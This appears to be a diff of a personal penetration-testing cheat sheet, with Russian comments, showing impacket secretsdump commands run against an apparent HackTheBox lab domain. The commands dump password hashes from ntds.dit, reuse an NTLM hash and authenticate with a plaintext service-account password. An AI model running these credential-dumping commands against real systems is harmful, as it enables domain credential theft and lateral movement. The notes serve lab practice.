@@ -98,7 +98,9 @@ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text
 
 impacket-secretsdump Administrator@192.168.50.200 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
 
-secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 --> password (Снаружи домена парсит ntds.dit)
+secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator --> password (Снаружи домена парсит ntds.dit)
+
+secretsdump.py egotistical-bank/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
 
 ----- Получить 10 последних пользователей
 
